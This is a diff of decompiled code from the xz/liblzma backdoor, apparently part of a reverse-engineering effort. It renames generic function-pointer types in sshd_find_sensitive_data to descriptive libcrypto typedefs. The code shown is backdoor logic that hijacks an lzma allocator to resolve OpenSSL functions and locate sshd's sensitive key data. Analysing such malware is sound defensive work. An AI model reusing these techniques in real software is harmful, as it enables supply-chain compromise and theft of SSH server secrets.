@@ -30,13 +30,13 @@ BOOL sshd_find_sensitive_data
   uint uVar7;
   uint uVar8;
   lzma_allocator *allocator_00;
-  _func_42 *p_Var9;
+  pfn_EVP_DigestVerifyInit_t ppVar9;
   void *pvVar10;
   Elf64_Sym *pEVar11;
   Elf64_Sym *pEVar12;
   u8 *data_start_00;
-  _func_46 *p_Var13;
-  _func_51 *p_Var14;
+  pfn_EVP_CIPHER_CTX_new_t ppVar13;
+  pfn_EVP_chacha20_t ppVar14;
   long lVar15;
   secret_data_item_t *psVar16;
   sensitive_data *psVar17;
@@ -100,9 +100,9 @@ BOOL sshd_find_sensitive_data
   local_90 = (sensitive_data *)0x0;
   allocator_00 = get_lzma_allocator();
   allocator_00->opaque = libcrypto;
-  p_Var9 = (_func_42 *)lzma_alloc(0x118,allocator_00);
-  funcs->EVP_DigestVerifyInit = p_Var9;
-  if (p_Var9 != (_func_42 *)0x0) {
+  ppVar9 = (pfn_EVP_DigestVerifyInit_t)lzma_alloc(0x118,allocator_00);
+  funcs->EVP_DigestVerifyInit = ppVar9;
+  if (ppVar9 != (pfn_EVP_DigestVerifyInit_t)0x0) {
     funcs->resolved_imports_count = funcs->resolved_imports_count + 1;
   }
   pvVar10 = elf_get_code_segment(sshd,(u64 *)&winning_candidate);
@@ -124,11 +124,11 @@ BOOL sshd_find_sensitive_data
     EVar1 = pEVar11->st_value;
     pEVar2 = libcrypto->elfbase;
     funcs->resolved_imports_count = funcs->resolved_imports_count + 1;
-    funcs->EVP_DigestVerify = (_func_43 *)(pEVar2->e_ident + EVar1);
+    funcs->EVP_DigestVerify = (pfn_EVP_DigestVerify_t)(pEVar2->e_ident + EVar1);
   }
-  p_Var13 = (_func_46 *)lzma_alloc(0x838,allocator_00);
-  funcs->EVP_CIPHER_CTX_new = p_Var13;
-  if (p_Var13 != (_func_46 *)0x0) {
+  ppVar13 = (pfn_EVP_CIPHER_CTX_new_t)lzma_alloc(0x838,allocator_00);
+  funcs->EVP_CIPHER_CTX_new = ppVar13;
+  if (ppVar13 != (pfn_EVP_CIPHER_CTX_new_t)0x0) {
     funcs->resolved_imports_count = funcs->resolved_imports_count + 1;
   }
   BVar5 = sshd_find_main(&local_a8,sshd,libcrypto,funcs);
@@ -151,10 +151,10 @@ BOOL sshd_find_sensitive_data
                     (data_start_00,data_start_00 + uVar3,code_start_00,local_a0,refs,&local_90);
   BVar6 = sshd_get_sensitive_data_address_via_krb5ccname
                     (data_start_00,data_start_00 + uVar3,code_start_00,local_a0,&local_98,sshd);
-  p_Var14 = (_func_51 *)lzma_alloc(0xc28,allocator_00);
+  ppVar14 = (pfn_EVP_chacha20_t)lzma_alloc(0xc28,allocator_00);
   psVar17 = local_90;
-  funcs->EVP_chacha20 = p_Var14;
-  if (p_Var14 != (_func_51 *)0x0) {
+  funcs->EVP_chacha20 = ppVar14;
+  if (ppVar14 != (pfn_EVP_chacha20_t)0x0) {
     funcs->resolved_imports_count = funcs->resolved_imports_count + 1;
   }
   if (BVar5 == FALSE) {
